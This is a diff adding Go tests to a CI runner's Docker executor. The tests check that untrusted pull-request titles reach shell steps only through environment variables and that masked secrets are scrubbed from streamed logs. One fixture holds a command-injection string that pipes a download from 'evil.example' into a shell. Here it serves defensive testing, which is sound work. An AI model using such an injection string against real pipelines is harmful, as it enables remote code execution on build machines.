@@ -31,6 +31,14 @@ func (loggingRunner) Run(_ context.Context, _ string, _ []string, stdout, stderr
 	return nil
 }
 
+type secretLoggingRunner struct{}
+
+func (secretLoggingRunner) Run(_ context.Context, _ string, _ []string, stdout, _ io.Writer) error {
+	_, _ = stdout.Write([]byte("hun"))
+	_, _ = stdout.Write([]byte("ter2\n"))
+	return nil
+}
+
 func TestDockerExecute_BuildsResourceCappedRunCommand(t *testing.T) {
 	t.Parallel()
 	rec := &recordingRunner{}
@@ -75,6 +83,38 @@ func TestDockerExecute_BuildsResourceCappedRunCommand(t *testing.T) {
 	}
 }
 
+func TestDockerExecute_RendersTaintedExpressionsThroughInputEnv(t *testing.T) {
+	t.Parallel()
+	rec := &recordingRunner{}
+	d := NewDocker(DockerConfig{
+		DefaultImage: "runner-image",
+		Network:      "bridge",
+		Memory:       "2g",
+		CPUs:         "2",
+		Runner:       rec,
+	})
+	malicious := `"; curl evil.example | sh #`
+	if _, err := d.Execute(t.Context(), Job{
+		ID:           1,
+		RunID:        2,
+		HeadSHA:      "abc",
+		HeadRef:      "refs/heads/trunk",
+		EventPayload: map[string]any{"pull_request": map[string]any{"title": malicious}},
+		WorkspaceDir: t.TempDir(),
+		Steps: []Step{{
+			Run: `echo "${{ shithub.event.pull_request.title }}"`,
+		}},
+	}); err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	if got := rec.args[len(rec.args)-1]; got != `echo "${SHITHUB_INPUT_0}"` {
+		t.Fatalf("rendered command: %q", got)
+	}
+	if !containsArg(rec.args, "SHITHUB_INPUT_0="+malicious) {
+		t.Fatalf("input binding missing from args: %#v", rec.args)
+	}
+}
+
 func TestDockerExecute_StreamsStepLogs(t *testing.T) {
 	t.Parallel()
 	d := NewDocker(DockerConfig{
@@ -109,6 +149,37 @@ func TestDockerExecute_StreamsStepLogs(t *testing.T) {
 	}
 	if got[0].JobID != 99 || got[0].StepID != 123 || got[0].Seq != 0 {
 		t.Fatalf("first chunk: %#v", got[0])
+	}
+}
+
+func TestDockerExecute_ScrubsStepLogsAcrossChunkBoundary(t *testing.T) {
+	t.Parallel()
+	d := NewDocker(DockerConfig{
+		DefaultImage:  "runner-image",
+		Network:       "bridge",
+		Memory:        "2g",
+		CPUs:          "2",
+		LogChunkBytes: 3,
+		Runner:        secretLoggingRunner{},
+	})
+	logs, err := d.StreamLogs(t.Context(), 99)
+	if err != nil {
+		t.Fatalf("StreamLogs: %v", err)
+	}
+	if _, err := d.Execute(t.Context(), Job{
+		ID:           99,
+		WorkspaceDir: t.TempDir(),
+		MaskValues:   []string{"hunter2"},
+		Steps:        []Step{{ID: 123, Run: "echo secret"}},
+	}); err != nil {
+		t.Fatalf("Execute: %v", err)
+	}
+	var got string
+	for chunk := range logs {
+		got += string(chunk.Chunk)
+	}
+	if got != "***\n" {
+		t.Fatalf("logs: %q", got)
 	}
 }
 
@@ -213,4 +284,13 @@ func TestContainerWorkdirRejectsEscapes(t *testing.T) {
 			t.Fatalf("containerWorkdir(%q) returned nil error", wd)
 		}
 	}
+}
+
+func containsArg(args []string, want string) bool {
+	for _, arg := range args {
+		if arg == want {
+			return true
+		}
+	}
+	return false
 }
